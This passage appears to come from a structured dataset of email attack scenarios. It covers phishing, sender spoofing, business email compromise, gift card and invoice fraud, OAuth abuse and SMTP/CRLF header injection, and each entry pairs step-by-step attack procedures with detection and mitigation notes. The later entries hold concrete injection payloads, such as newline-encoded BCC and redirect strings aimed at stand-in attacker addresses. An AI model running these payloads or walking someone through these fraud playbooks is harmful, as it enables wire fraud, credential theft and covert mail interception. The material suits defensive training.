Attack Steps: Step 1: Create Windows shortcut file “Invoice.lnk” pointing to: wscript.exe hidden_script.vbs.Step 2: Bundle it in ZIP with a few fake invoice images.Step 3: Email from “vendor.invoice@traderszone.com”.Step 4: Message: “Attached latest invoice package. Need approval today.”Step 5: Supervisor opens ZIP and clicks on .lnk thinking it's a PDF.Step 6: VBScript runs silently and creates reverse shell.Step 7: Attacker uses shell to list network shares.
Detection Method: LNK execution monitoring
Solution: Block shortcut execution from ZIPs

Title: Phishing with Outlook Rules + Payload in EML
Scenario Description: EML file contains rule that forwards all emails + embedded payload.
Tools Used: Outlook Rules, EML injector, phishing kit
Attack Steps: Step 1: Create malicious EML with hidden Outlook rule to forward emails to attacker’s inbox.Step 2: Embed JavaScript or HTA script as attachment in same EML.Step 3: Compose spoofed message: “Please review this client complaint email chain.”Step 4: User double-clicks EML and allows rule.Step 5: Outlook forwards all new messages silently.Step 6: If user opens HTA attachment, payload runs and drops malware.Step 7: Attacker now reads internal email threads + has remote access.
Detection Method: Outlook rule audits, EML scanning
Solution: Disallow rule imports, block HTA

Title: Spoofed Delivery Notification
Scenario Description: Attacker mimics a known delivery service and tricks victim into clicking a malicious link in a fake tracking email.
Attack Steps: Step 1: Create a fake “delivery failed” email design using Canva. Step 2: Write a Python script to send email using smtplib. Step 3: Set MAIL FROM as no-reply@fedxtrack.com (typo domain). Step 4: Embed fake tracking link that leads to credential-harvesting page. Step 5: Send to victim via SMTP2GO (free tier). Step 6: Track link clicks using a URL shortener.
Detection Method: Unusual domain detection, link scanners
Solution: User education, domain name filters

Title: Exploiting Unverified 'From' Header
Scenario Description: Exploit where attacker spoofs the 'From' field using a marketing tool that does not validate sender identity.
Attack Steps: Step 1: Create a MailChimp free account. Step 2: Add victim email to mailing list. Step 3: Compose message claiming "New HR Policy - Click to Acknowledge". Step 4: Set 'From' to hr@targetcompany.com (even if unverified). Step 5: Send the email via platform’s SMTP or campaign dashboard. Step 6: Victim sees legitimate-looking spoofed mail.
Detection Method: Log analysis, marketing domain audits
Solution: Use verified domains only, enforce SPF/DKIM

Title: CEO Impersonation via Custom SMTP Server
Scenario Description: Attacker hosts their own SMTP server to craft and deliver emails as if sent by CEO, bypassing security controls.
Attack Steps: Step 1: Deploy VPS with Postfix mail server. Step 2: Configure server without SPF/DKIM. Step 3: Set MAIL FROM: ceo@company.com Step 4: Compose a message requesting wire transfer approval. Step 5: Send to finance@company.com with high-priority flag. Step 6: Track response using a reply-to alias.
Detection Method: Analyze header source IP, reply-to mismatch
Solution: Enforce DMARC with reject policy

Title: SPF Bypass Using Similar Domain
Scenario Description: Spoofer registers a domain visually similar to target and bypasses SPF checks by using legitimate DNS records.
Tools Used: Domain Registrar, SMTP Service, SPF Tester
Attack Steps: Step 1: Register a domain like micros0ft-support.com. Step 2: Set up SPF records to appear legitimate. Step 3: Use SMTP service to send mail as support@micros0ft-support.com. Step 4: Craft a "security alert" asking user to verify account. Step 5: Send email and monitor click activity. Step 6: Capture credentials via phishing page.
Detection Method: Header analysis, visual similarity tools
Solution: Brand domain monitoring, anti-phishing filters

Title: Abuse of Public Email Services
Scenario Description: Hacker uses free email platforms (e.g., SendGrid, SMTP2GO) with minimal verification to spoof internal staff.
Attack Steps: Step 1: Sign up for SendGrid with temporary email. Step 2: Bypass sender verification by editing email header in raw mode. Step 3: Set sender as legal@targetcompany.com. Step 4: Attach fake legal notice document (PDF with payload). Step 5: Send to HR or Legal department. Step 6: Await execution or reply.
Vulnerability: Public SMTP with weak header enforcement
Detection Method: Header mismatch, sandboxing attachments
Solution: Require DKIM verification for all inbound mail

Title: Vendor Spoof Using Forwarding Trick
Scenario Description: Attacker spoofs a vendor's domain and uses an email forwarding trick to make reply chains look legit.
Attack Steps: Step 1: Set up Gmail with fake vendor-like account (vendorpayments@gmail.com). Step 2: Send mail with forged 'From' field as billing@vendor.com. Step 3: Victim replies, email gets forwarded to attacker. Step 4: Attacker replies back with "updated account details". Step 5: Social engineer finance team into fund diversion. Step 6: Monitor for incoming funds.
Detection Method: Header tracing, anomaly in reply-to field
Solution: Enforce SPF/DKIM & validate reply-to domains
Tags: vendor fraud, reply abuse, smtp spoof

Title: Spoofed IT Alert for Software Update
Scenario Description: Attacker impersonates IT and sends a spoofed email asking employees to install a fake update.
Tools Used: Python SMTP, Paint.NET (to fake branding), Free SMTP relay
Attack Steps: Step 1: Design an email using fake IT branding saying "Critical Update Needed". Step 2: Register a spoofed domain like it-supports.com. Step 3: Use Python's smtplib to send emails. Step 4: In the MAIL FROM: field, spoof support@realcompany.com. Step 5: Include a link to a ZIP file containing a malicious .exe. Step 6: Send to 10 internal staff. Step 7: Await download and execution.
Detection Method: Email header check, file type filter
Solution: Enforce sender policy & block .exe attachments

Title: Fake Calendar Invite Using Spoofed Executive Identity
Scenario Description: A spoofed email is used to send a malicious calendar invite posing as an executive to create urgency.
Attack Steps: Step 1: Use Outlook to generate a calendar invite (.ics) file. Step 2: Include message like “Quarterly Budget Meeting – Mandatory”. Step 3: Attach malicious macro-enabled file or link in event description. Step 4: Set MAIL FROM: to cfo@targetfirm.com. Step 5: Use EvilSMTP server to send invite to finance@targetfirm.com. Step 6: Monitor for engagement.
Detection Method: Analyze .ics contents, alert on new sender exec
Solution: Disable external calendar auto-import

Title: Government Tax Scam Email
Scenario Description: Attacker mimics government tax office email domain to scare users into providing personal info.
Attack Steps: Step 1: Design a realistic tax notice email saying “Immediate Tax Review Required”. Step 2: Register spoof domain gov-taxalert.in. Step 3: Use SMTP2GO to send spoofed emails using MAIL FROM: taxdept@gov.in. Step 4: Include a phishing link to fake login page. Step 5: Embed tax file for download (Excel macro payload). Step 6: Monitor for user input or file execution.
Detection Method: Compare sender domain, link redirection tracking
Solution: Public awareness training, domain whitelisting

Title: Spoofed Alert About Suspicious Login
Scenario Description: User receives spoofed security alert claiming a suspicious login and is asked to verify details.
Tools Used: Google Forms, Free SMTP relay, SpoofMailer
Attack Steps: Step 1: Use Canva to replicate branding of Microsoft/Google alert emails. Step 2: Create Google Form asking for "account confirmation". Step 3: Use SpoofMailer to send from security@google.com. Step 4: Email subject: “Security Alert: Login from Russia”. Step 5: Insert urgent message with form link. Step 6: Victim inputs credentials.
Detection Method: Link scanning, sender mismatch detection
Solution: 2FA enforcement, URL filtering

Title: Internal HR Email Spoof for Salary Revision
Scenario Description: Spoofed email from HR says salaries are revised and includes Excel with embedded malware.
Attack Steps: Step 1: Create Excel with macro payload. Step 2: Save as “SalaryRevision_July2025.xlsm”. Step 3: Write fake message from hr@company.com saying “attached revised salary structure”. Step 4: Use YOPmail’s relay to spoof the sender address. Step 5: Send to target’s HR and payroll staff. Step 6: Wait for file open (auto-exec macro).
Vulnerability: Lack of attachment validation, spoofed 'From' field
Detection Method: Disable macros, scan headers, file sandboxing
Solution: Block macro-enabled office files

Title: Voicemail Spoof Attack
Scenario Description: Attacker sends an email pretending to be voicemail from internal telephony system with malicious audio attachment.
Attack Steps: Step 1: Record a 10-second generic voicemail message. Step 2: Save as voicemail.wav. Step 3: Compress into ZIP along with a script or hidden payload. Step 4: Spoof sender as vm@targetcompany.com. Step 5: Subject: "You have a new voicemail (0:10)" Step 6: Send using EmailSpoofer via open SMTP relay.
Detection Method: Scan ZIPs, analyze email origin IP
Solution: Block ZIP attachments, validate voicemail domains

Title: SMTP Spoof Through Compromised IoT Printer
Scenario Description: Attacker uses an exposed IoT printer’s email feature to send spoofed alerts to users.
Tools Used: Shodan, Telnet, IoT Printer SMTP Panel
Attack Steps: Step 1: Use Shodan to find printers with open SMTP ports. Step 2: Access internal web UI without login. Step 3: Configure outbound email settings with spoofed alerts@company.com. Step 4: Compose alert email about “Paper jam auto-refill billing”. Step 5: Send to finance or admin department. Step 6: Include PDF with embedded malicious script.
Vulnerability: IoT device exposure and weak auth
Detection Method: Monitor network SMTP activity, IoT email headers
Solution: Secure IoT SMTP settings, firewall rules

Title: Spoofed Meeting Link with Credential Stealer
Scenario Description: Hacker spoofs a Zoom/Teams invite and asks users to log in via fake SSO portal.
Tools Used: HTML Email Builder, Zoom Spoof Page, SMTP Relay
Attack Steps: Step 1: Build fake Zoom invite HTML email. Step 2: Link button to zoom-corporate-login.com. Step 3: Set From header to noreply@zoom.us. Step 4: Send to employees using public SMTP relay. Step 5: User opens and clicks link. Step 6: Credentials are harvested via fake login form.
Detection Method: Browser redirect warnings, sandboxing
Solution: SSO link validation, Zoom domain enforcement

Title: Fake PayPal Receipt from Trusted Contact
Scenario Description: Attacker spoofs PayPal receipt from a friend’s email to deliver malware.
Attack Steps: Step 1: Design fake PayPal receipt using receipt generator. Step 2: Set spoofed sender as friend@gmail.com. Step 3: Compose email saying "Here’s your payment receipt!" Step 4: Attach PDF with embedded JavaScript. Step 5: Send via forged SMTP headers using public SMTP tool. Step 6: Target opens PDF triggering malware.
Detection Method: Header mismatch, sandbox PDF
Solution: Educate on attachments from “trusted” senders

Title: Fake IT System Maintenance Alert
Scenario Description: Email sent pretending to be from IT informing users of system downtime and prompting login.
Attack Steps: Step 1: Write HTML email saying “We are performing system updates. Log in here to preserve access.” Step 2: Set fake From: it-team@company.com. Step 3: Link to a cloned internal login portal. Step 4: Send via Mailtrap or SMTP test server. Step 5: Employee clicks and logs in. Step 6: Credentials stolen.
Detection Method: Detect cloned portal links
Solution: Login behavior monitoring, alerts

Title: CEO Impersonation for Wire Fraud
Scenario Description: Attacker impersonates the CEO and tricks the finance team into wiring money to a fake vendor account.
Attack Steps: Step 1: The attacker gathers public data about the CEO (LinkedIn, company site).Step 2: They register a lookalike email (e.g., ceo.john@compaany.com).Step 3: They craft a short urgent email requesting wire transfer for a “confidential acquisition.”Step 4: They send the email during a holiday/weekend to avoid verification delays.Step 5: The finance staff proceeds with the transfer due to perceived urgency.Step 6: The money is transferred to an attacker-controlled account.
Vulnerability: Lack of email domain validation (DMARC/DKIM/SPF misconfigurations)
Impact: Financial loss due to fraudulent wire transfer
Detection Method: Analyze email headers, monitor anomalous transfer requests
Solution: Enforce strict email policies, train employees, enable DMARC, SPF, DKIM

Title: Vendor Email Compromise to Alter Bank Details
Scenario Description: Attacker gains access to a vendor’s email account and changes payment instructions in an invoice.
Attack Steps: Step 1: Attacker sends a phishing email to a vendor employee to steal credentials.Step 2: Using the stolen credentials, attacker logs into vendor’s email.Step 3: They search for invoices sent to the target company.Step 4: They edit the bank details in an existing invoice and resend it.Step 5: The target company processes the invoice and pays to attacker’s account.Step 6: Money is stolen without immediate detection since email came from legit domain.
Vulnerability: Weak password and no MFA on vendor email
Impact: Unauthorized transfer to attacker’s bank account
Detection Method: Monitor vendor emails for metadata changes, confirm payment instruction changes verbally
Solution: Mandate MFA on vendor emails, confirm bank details through phone calls

Title: Domain Spoofing for Fake Invoice Request
Scenario Description: Attacker spoofs a trusted supplier domain to request payment for fake services.
Attack Steps: Step 1: Attacker identifies key vendors of the target company (via public records or breaches).Step 2: Registers a domain similar to the vendor (e.g., inv0ices-acme.com).Step 3: Creates a convincing invoice mimicking real vendor style.Step 4: Sends the invoice from a spoofed domain to AP (Accounts Payable).Step 5: Follows up with a call using spoofed number for urgency.Step 6: Payment is processed without realizing vendor identity was faked.
Vulnerability: Email domain not properly verified, and lack of vendor validation
Detection Method: Monitor unusual domain names, check DMARC/SPF failure alerts
Solution: Implement email authentication, verify invoices via multi-step approval

Title: Internal HR Email Compromise for Payroll Redirect
Scenario Description: Attacker compromises internal HR email and requests payroll redirection to new attacker-controlled bank accounts.
Attack Steps: Step 1: Attacker sends HR-themed phishing email to an employee using Zphisher.Step 2: Employee clicks on fake HR portal and enters credentials.Step 3: Attacker logs into the real HR email system.Step 4: Sends email to payroll stating “employee changed bank account.”Step 5: Payroll updates account info and processes the next salary.Step 6: Employee doesn’t receive salary; funds go to attacker’s account.
Vulnerability: Lack of email login protection, no secondary verification for bank changes
MITRE Technique: T1078.004 (Email Access via Phishing), T1556 (Credential Phishing)
Detection Method: Detect multiple geo-locations for email login, audit payroll change requests
Solution: Use 2FA for email, confirm payroll changes by verbal or video call

Title: Executive Assistant Account Hijack
Scenario Description: Attacker compromises the executive assistant’s email to send fraudulent payment requests to internal teams.
Attack Steps: Step 1: Attacker identifies CEO’s assistant from company LinkedIn page.Step 2: Sends phishing email with fake calendar invite to assistant’s mailbox.Step 3: When assistant clicks, a fake login page captures credentials.Step 4: Attacker accesses email and studies internal communication.Step 5: Sends payment requests on behalf of the CEO to the finance team.Step 6: Finance processes the request, assuming it's approved by leadership.
Vulnerability: Email phishing and poor mailbox protection
Detection Method: Login anomaly alerts, monitor unusual email patterns
Solution: Train VIP assistants, use strong 2FA on high-value accounts

Title: Multilingual Invoice Scam
Scenario Description: Attacker uses language-specific invoice emails targeting global accounting departments to increase legitimacy.
Attack Steps: Step 1: Attacker identifies the accounting contact and preferred language (e.g., French or Spanish).Step 2: Translates a fake invoice and email using accurate grammar tools.Step 3: Sends email from a spoofed or typosquatted domain (e.g., vend0r-fr.com).Step 4: Includes legitimate invoice numbering and format patterns.Step 5: Accounting team proceeds with payment due to familiarity with format.Step 6: Transfer goes to attacker’s foreign bank account.
Impact: Loss due to realistic cross-border fraud
Detection Method: Language-based anomaly detection, invoice format mismatches
Solution: Centralize vendor validation; introduce multilingual training for fraud

Title: Microsoft 365 OAuth Abuse for Persistence
Scenario Description: Attacker tricks user into authorizing a malicious third-party app, maintaining long-term access even after password change.
Attack Steps: Step 1: Attacker sends phishing email with link to “new productivity tool.”Step 2: User clicks and grants OAuth permission (without entering credentials).Step 3: App now has tokenized access to user’s mailbox and calendar.Step 4: Attacker creates inbox rules to hide incoming alerts or replies.Step 5: Attacker sends fraudulent invoices or payment instructions.Step 6: Access persists even if user changes password.
Vulnerability: OAuth token abuse and lack of app permission control
Impact: Long-term stealth access to sensitive mailboxes
Detection Method: Monitor new app consents and unusual inbox rules
Solution: Limit app access via admin control; educate users on OAuth risks

Title: Split-Invoice Fraud Using Compromised Chain
Scenario Description: Attacker intercepts legitimate communication and splits a large invoice into two smaller ones to avoid triggering internal review.
Attack Steps: Step 1: Attacker compromises vendor email via phishing.Step 2: Finds invoice email chain with the target customer.Step 3: Modifies the upcoming invoice into two smaller amounts.Step 4: Sends “split invoices” pretending it's a vendor policy update.Step 5: Customer pays both invoices unaware the vendor email is hijacked.Step 6: Money is sent to two attacker-controlled accounts.
Vulnerability: Lack of endpoint protection on vendor side
Detection Method: Detect new payment account mismatches
Solution: Use callback verification and flag split invoices

Title: Compromise of Shared Mailbox (Finance@)
Scenario Description: Attacker compromises a commonly used shared mailbox (e.g., finance@company.com) and sends internal requests for urgent payments.
Attack Steps: Step 1: Attacker brute-forces shared mailbox credentials or finds leaked ones.Step 2: Logs in and monitors emails silently for days.Step 3: Replies to ongoing threads with fake urgent transfer requests.Step 4: Spoofs previous styles and formatting for believability.Step 5: Internal staff sends money without suspecting foul play.Step 6: Attacker deletes traces and exfiltrates mail logs.
Vulnerability: Weak shared mailbox credentials; no MFA
Detection Method: Monitor shared mailbox access logs
Solution: Enforce strong passwords + MFA on shared mailboxes

Title: Compromised Travel Booking Confirmation Attack
Scenario Description: Attacker compromises a travel desk email and sends a fake payment request for booking flight/hotel urgently on behalf of executive.
Attack Steps: Step 1: Attacker identifies travel coordinator email and targets it with phishing.Step 2: Gains access and studies travel request patterns.Step 3: Crafts fake flight/hotel invoice in same format and sends it to accounts.Step 4: Message appears to be from internal travel desk with urgent subject.Step 5: Finance sends money thinking it’s for approved travel.Step 6: Attacker deletes traces to remain hidden.
Vulnerability: Poor email segmentation; no second-level payment approval
Detection Method: Cross-verify bookings with known vendor numbers
Solution: Use trusted travel portals; segregate travel and finance roles

Title: Fake Legal Notice Pressure Attack
Scenario Description: The attacker impersonates a law firm threatening legal action to pressure finance teams into paying a “settlement” fee.
Attack Steps: Step 1: Attacker researches the company’s legal advisors or uses a generic law firm template.Step 2: Creates a fake law firm email (e.g., legalteam@davislaws.co).Step 3: Designs a PDF “settlement agreement” citing made-up case numbers.Step 4: Sends an email to finance team marked “URGENT LEGAL ACTION: Confidential.”Step 5: Instructs them to wire settlement fee to avoid court litigation.Step 6: Finance pays quickly due to fear of reputational damage.Step 7: Attacker deletes domain after receiving funds.
Vulnerability: No legal email validation process, urgency response bias
Detection Method: Review incoming email headers, look for fake domains
Solution: Legal hold policy with approval chain for law firm communication

Title: Fake Acquisition Notice to Mislead Stakeholders
Scenario Description: Attacker pretends to be a company executive and falsely informs finance that the firm is acquiring a smaller company, requesting urgent payment.
Attack Steps: Step 1: Attacker spoofs executive identity using similar email (ceo.jack@yourcorp.co instead of .com).Step 2: Crafts convincing acquisition announcement and NDA attachment.Step 3: Sends internal email to CFO or financial controller.Step 4: Requests urgent payment to secure the deal.Step 5: Claims confidentiality to discourage verification.Step 6: Funds are wired to attacker-controlled bank with “M&A Fund” reference.Step 7: Fraud is detected only after media hears rumors and confirms no such deal.
Vulnerability: Domain impersonation and lack of internal protocol for M&A
Detection Method: Email spoof detection, internal whistleblowing
Solution: M&A must require board-level digital approval

Title: Compromised Printer Alerts Used to Deliver Invoices
Scenario Description: The attacker compromises a network printer’s SMTP and sends out fake invoices using “scan-to-email” functions.
Attack Steps: Step 1: Attacker finds exposed printer interface on Shodan.Step 2: Uses default credentials to access and configure SMTP.Step 3: Uploads a fake invoice PDF to the printer.Step 4: Sends the document to internal finance staff as “Scanned Invoice - [Vendor Name]”.Step 5: Message comes from a known internal IP and appears trustworthy.Step 6: Payment is made before validation due to perceived authenticity.Step 7: Logs are wiped remotely from printer memory.
Vulnerability: Exposed network devices with unauthenticated SMTP access
Detection Method: Monitor SMTP logs from printers, detect unusual recipients
Solution: Segment printers from financial staff networks; use SMTP auth

Title: Impersonation of Recruiting Agency
Scenario Description: Attacker pretends to be a staffing agency and sends an invoice for recent “contractor onboarding.”
Attack Steps: Step 1: Attacker identifies HR contacts via LinkedIn.Step 2: Registers domain similar to a known recruiter (e.g., talent-sourcerz.com).Step 3: Sends email stating “invoice for June’s hired contractors.”Step 4: Includes contractor names scraped from LinkedIn (fake profiles).Step 5: Email is marked “Net 7 Payment” and pushed with urgency.Step 6: HR forwards invoice to finance; payment is processed without due diligence.Step 7: Attacker disappears after transfer.
Vulnerability: Lack of cross-check between HR and payment team
Impact: Theft disguised as routine staffing cost
Detection Method: Match contractors in HR database before paying third parties
Solution: Shared internal access to verified vendor lists

Title: IT Equipment Supply Chain Spoof
Scenario Description: A fake IT vendor sends a purchase invoice for recently approved hardware procurement.
Tools Used: MailMerge Toolkit, FakeDomainCreator, PDF Invoice Generator
Attack Steps: Step 1: Attacker scrapes IT procurement documents from public vendor sites.Step 2: Registers a domain close to an existing supplier (e.g., techwizee.net).Step 3: Sends email to IT purchase officer copying a real previous quote.Step 4: Includes a fake invoice for “rush shipment of 12 laptops.”Step 5: Says the shipment has already left and must be paid to avoid penalty.Step 6: The payment is made assuming it’s part of an earlier approved deal.Step 7: Fake supplier is never heard from again.
Impact: Payment theft posing as IT supply
Detection Method: Track invoice numbers against purchase orders
Solution: Enforce 3-way PO-matching policy

Title: Charity Donation Scam From Executive
Scenario Description: Attacker pretends to be an executive requesting company donation to a fake charity.
Attack Steps: Step 1: Attacker spoofs or hijacks the CEO’s email.Step 2: Sends message to CSR (Corporate Social Responsibility) officer.Step 3: Claims the CEO wants to donate quickly to a disaster relief campaign.Step 4: Includes fake charity website and tax receipt.Step 5: CSR, trying to impress leadership, processes payment.Step 6: Money is wired to attacker’s account masked under “nonprofit.”Step 7: Real CEO denies knowledge of the donation.
Vulnerability: Emotionally driven attacks + fake nonprofit identities
Detection Method: Lookup nonprofit tax ID validity
Solution: Verify charitable donations via board consent

Title: Business Travel Itinerary Spoof with Expense Claim
Scenario Description: Attacker sends spoofed travel confirmation with a reimbursement claim for an executive’s recent trip.
Tools Used: Fake Booking Generator, Mail Header Forger
Attack Steps: Step 1: Attacker learns about executive’s real travel via social media.Step 2: Creates a fake invoice from a travel provider.Step 3: Sends a follow-up email impersonating the executive assistant requesting reimbursement.Step 4: Email includes booking number and travel details that match public info.Step 5: Finance approves the transfer as the trip did happen.Step 6: Attacker uses fake PayPal or Revolut ID to collect the funds.Step 7: Invoice is removed before quarterly audits.
Vulnerability: Too much info shared publicly about travel
Impact: Expense fraud using real event context
Detection Method: Audit trails and booking references
Solution: Travel bookings must only go through official apps

Title: Gift Card Scam via CEO Email
Scenario Description: Attacker impersonates CEO and requests HR to urgently buy gift cards for client engagement.
Attack Steps: Step 1: Attacker spoofs CEO email (ceo.jane.smith@yourcomnpany.com).Step 2: Sends email to HR stating “urgent client event today, need 10x$200 Amazon cards.”Step 3: Requests cards be scratched and codes shared over email.Step 4: HR, believing it’s urgent and confidential, complies.Step 5: Attacker uses codes or sells them on the dark web.Step 6: CEO denies sending any such mail next day.
Vulnerability: Blind trust in executive authority + urgency tactic
Detection Method: Policy: never send codes via email
Solution: Multi-level validation for prepaid requests

Title: SaaS Billing Alert Fraud
Scenario Description: Attacker sends fake overdue billing alert from a SaaS vendor (e.g., Zoom, Adobe) requesting payment.
Tools Used: Email Template Cloner, FakeBillService, Adobe Editor
Attack Steps: Step 1: Attacker identifies SaaS tools commonly used (via job posts).Step 2: Crafts “Final Overdue Notice” from Zoom billing (e.g., billing@z00m.us).Step 3: Email includes login link and a direct bank payment option.Step 4: Urges the user to “avoid service disruption.”Step 5: Billing team pays invoice without verifying authenticity.Step 6: Attacker disappears with payment.
Detection Method: Validate vendors by internal SaaS inventory
Solution: Create vendor allow-list for payment

Title: Multi-Threaded BEC Campaign
Scenario Description: Attacker targets multiple departments (HR, Finance, Legal) simultaneously to increase confusion and create urgency.
Tools Used: Cobalt Strike (for lateral email), GoPhish, Multiple Domain Kits
Attack Steps: Step 1: Compromises one internal email account using phishing.Step 2: Uses the compromised account to email multiple departments at once.Step 3: Sends different tailored messages to each team: gift card request to HR, invoice to Finance, NDA to Legal.Step 4: All messages appear legitimate since they come from internal source.Step 5: Each department responds independently, unaware of attack campaign.Step 6: Attacker collects funds from multiple sources.Step 7: Cleanup script deletes inbox rules and emails.
Vulnerability: Lack of central fraud detection + poor lateral movement defense
Detection Method: Central alert system for mass internal requests
Solution: Enable lateral phishing alerts and monitor inbox rule changes

Title: Injecting Extra Recipients in Feedback Forms
Scenario Description: An attacker adds CC/BCC recipients via feedback form to silently forward messages to themselves.
Tools Used: Burp Suite, Firefox Dev Tools, Mailtrap
Attack Steps: Step 1: Find a site with a feedback/contact form (e.g., feedback box). Step 2: Type a normal message, but inject in the “email” field: attacker@example.com%0ABCC:spy@example.com. Step 3: Use Burp Suite to send the request. Step 4: Check Mailtrap or any mailbox to see if email is secretly sent to spy@example.com. Step 5: Repeat with different BCCs to simulate data exfiltration.
Vulnerability: Lack of newline filtering in email headers
Detection Method: Unusual CC/BCC patterns in outgoing logs
Solution: Input sanitation to remove newlines in email fields

Title: Manipulating Subject Line for Phishing
Scenario Description: Subject line is injected via input field to make phishing messages more believable.
Attack Steps: Step 1: Visit a "share with a friend" form on a marketing site. Step 2: In the name or subject input, inject: Hello%0ASubject: Urgent! Reset Your Password Now. Step 3: Intercept and modify request using ZAP Proxy. Step 4: Observe how recipient gets an email with custom subject, mimicking a legitimate service. Step 5: Use it to simulate a phishing link.
Impact: Target tricked into opening phishing email
Detection Method: Email filters triggering unusual subject tags
Solution: Strict input validation for Subject fields

Title: HTML Injection in Email Body via SMTP Headers
Scenario Description: Attacker injects HTML or JavaScript in email body via unsanitized form input.
Attack Steps: Step 1: Create a test form that sends email using PHP's mail() function. Step 2: Inject the message field with: %0AContent-Type: text/html. Step 3: Submit the form and monitor MailCatcher. Step 4: Note how the HTML is rendered in the email client. Step 5: Use to simulate image-based tracking or visual manipulation.
Detection Method: Unexpected HTML in plain-text email
Solution: Force content-type to plain text

Title: Internal Reconnaissance via Bounced Headers
Scenario Description: Injected headers cause bounce messages to leak internal routing or server data.
Attack Steps: Step 1: Inject unusual Return-Path: or X-Originating-IP: into an email using Netcat. Step 2: Send to a non-existent internal user. Step 3: Capture bounce message in honeypot. Step 4: Analyze headers in bounce for leaked IPs, hostnames, or internal domains. Step 5: Use this info to map internal infrastructure.
Impact: Internal info disclosure via header leaks
Detection Method: Analyze bounce and NDR patterns
Solution: Sanitize bounce messages, block spoofed headers

Title: Spoofing "From" Address in SMTP Relay
Scenario Description: Attacker spoofs the sender address in a mail relay system by injecting From: header directly.
Attack Steps: Step 1: Connect to SMTP relay using Telnet or Python. Step 2: Issue MAIL FROM:<attacker@example.com> and inject header: From: "Bank Support" <support@bank.com> Step 3: Compose fake email content urging action. Step 4: Send to user mailbox. Step 5: Observe spoofed email bypassing basic filters.
Vulnerability: No header sanitization in relay systems
Detection Method: Header mismatch alerts, DKIM failure
Solution: Reject or overwrite injected From headers

Title: Abuse of Web Mailer Plugin with Injection
Scenario Description: CMS plugin allows user-submitted values to inject headers, causing mail abuse or internal spam.
Tools Used: WordPress, WP Mail Log Plugin, Burp Suite
Attack Steps: Step 1: Set up WordPress site with a contact plugin. Step 2: In "Your Email" field, inject: attacker@example.com%0ACC: internal@example.org Step 3: Monitor plugin logs to confirm CC was added. Step 4: Repeat to flood internal mailboxes or exfiltrate info. Step 5: Test with different header combinations for DoS simulation.
Vulnerability: Third-party plugin failing to sanitize input
Detection Method: Log monitoring in CMS, header alerting
Solution: Patch plugin, validate mail fields
Tags: CMS Injection, Plugin Exploit, Header Injection

Title: SMTP Header Injection via Mobile App Feedback
Scenario Description: A mobile app uses an HTTP API to send feedback that is eventually relayed via email. Attacker manipulates the email header through mobile API traffic.
Attack Steps: Step 1: Launch a mobile app with a feedback option. Step 2: Use HTTP Toolkit to intercept the feedback submission request. Step 3: In the "Name" field of the request, inject: Attacker%0ABCC:attacker@example.com. Step 4: Let the request go through. Step 5: Check Mailtrap inbox to confirm email was sent with added BCC. Step 6: Repeat to simulate silent email interception from mobile app traffic.
Vulnerability: Unsanitized inputs passed to mail API
Impact: Covert recipient spying via mobile channel
Detection Method: Email logs showing unexpected BCCs
Solution: Validate user inputs in mobile APIs

Title: Manipulating Email Priority and Flags via Header Injection
Scenario Description: Attackers inject headers like X-Priority, Disposition-Notification-To to make their spam or phishing emails appear urgent.
Attack Steps: Step 1: Connect to a test SMTP server using Telnet or Python's smtplib. Step 2: Write headers such as: X-Priority: 1%0ADisposition-Notification-To: attacker@example.com. Step 3: Send to victim’s inbox. Step 4: Open in email client (e.g., Thunderbird) and observe that the message is marked as high priority. Step 5: Optionally, trigger auto-reply to attacker.
Impact: Attention hijacking; auto-disclosure of victim activity
Detection Method: Flags like “Disposition-Notification-To” in logs
Solution: Strip or limit untrusted headers

Title: SMTP Injection in IoT Notification Services
Scenario Description: IoT devices (like smart thermostats) often allow custom messages via web interfaces. This is exploited to inject headers into alert emails.
Tools Used: IoT Device Interface, Burp Suite, Packet Capture Tools
Attack Steps: Step 1: Access the IoT admin web interface. Step 2: Locate alert configuration and inject in the "Message" field: Temperature exceeded%0ACC: attacker@example.com. Step 3: Use Burp Suite to intercept the request and confirm payload. Step 4: Trigger an alert (e.g., artificially raise temperature). Step 5: Capture the resulting email being forwarded with injected BCC.
Vulnerability: Lack of input filtering on embedded systems
Detection Method: Analyze headers in outgoing emails
Solution: Sanitize IoT alert input fields

Title: Social Engineering via X-Mailer Header Injection
Scenario Description: An attacker inserts fake "X-Mailer" header to impersonate official mail clients (e.g., Outlook, Gmail).
Tools Used: Python SMTP Script, Email Header Viewer
Attack Steps: Step 1: Craft email with additional header: X-Mailer: Microsoft Outlook 16.0. Step 2: Send it through test SMTP server to a mailbox. Step 3: Open in email client and view message source. Step 4: Note that the email looks like it came from a corporate Outlook instance. Step 5: Use this method to enhance realism in phishing scenarios.
Vulnerability: Header spoofing in MUA trust logic
Detection Method: Monitor X-Mailer anomalies
Solution: Filter/rewrite suspicious metadata

Title: Injecting Multiple Subject Headers
Scenario Description: Some misconfigured mail servers accept multiple Subject headers. Attackers can place phishing subject after the legit one.
Tools Used: Raw SMTP Client, Outlook Web App
Attack Steps: Step 1: Prepare an email with: Subject: Welcome%0ASubject: Urgent! Verify Account. Step 2: Submit using raw SMTP client. Step 3: Observe that some clients show the second Subject instead of the first. Step 4: Use this to trick recipients into opening malicious content. Step 5: Log which email clients are vulnerable.
Detection Method: Dual subject header detection
Solution: Enforce RFC compliance in parsing

Title: Bypassing Spam Filters via Newline Obfuscation
Scenario Description: Emails are crafted with newline obfuscation to bypass keyword-based spam filters.
Tools Used: SMTP Debug Tool, Regex-based Spam Filter
Attack Steps: Step 1: Write a subject line like: Subject: Win%0A money%0A now. Step 2: Send using SMTP tool. Step 3: Observe how spam filter doesn’t match due to newline-split keywords. Step 4: Message is delivered to inbox instead of spam. Step 5: Demonstrate evasion by varying keyword locations.
Detection Method: Regex inspection of multi-line headers
Solution: Normalize headers before scanning

Title: Web-to-Email Gateway Exploitation
Scenario Description: Public feedback forms send messages via backend SMTP. Attackers hijack this for malicious redirection.
Attack Steps: Step 1: Locate a web-to-email form (e.g., refer a friend). Step 2: Inject in name field: John Doe%0ARedirect: http://malicious.com. Step 3: Submit and capture final email. Step 4: Note inclusion of malicious redirect in header or body. Step 5: Use this for client-side phishing simulation.
Detection Method: Monitor for non-standard headers
Solution: Sanitize and whitelist only valid headers

Title: CRLF Injection in SMTP Logs
Scenario Description: Carriage Return + Line Feed injection manipulates how logs are recorded, allowing log poisoning.
Attack Steps: Step 1: Inject: attacker@example.com%0AError: Authentication Failed into sender field. Step 2: Submit to SMTP server. Step 3: Check logs and observe altered log format. Step 4: Demonstrate how log monitoring tools can be misled. Step 5: Simulate hiding malicious activity in logs.
Detection Method: Monitor for malformed log lines
Solution: Strip CRLF from all inputs

Title: MIME Confusion via Header Injection
